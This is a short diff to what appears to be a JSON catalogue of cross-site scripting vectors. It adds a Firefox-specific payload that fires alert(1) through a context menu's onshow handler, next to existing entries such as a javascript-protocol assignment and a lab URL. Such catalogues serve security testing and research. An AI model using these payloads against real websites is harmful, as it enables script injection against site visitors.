@@ -166,6 +166,11 @@
     "browsers": ["firefox"]
   },
   {
+    "description": "onshow event for menu element in Firefox v102 and below",
+    "code": "<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>",
+    "browsers": ["firefox"]
+  },
+  {
     "description": "Assignable protocol with location",
     "code": "<script>location.protocol='javascript'</script>",
     "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C/script%3E#%0aalert%281%29//",
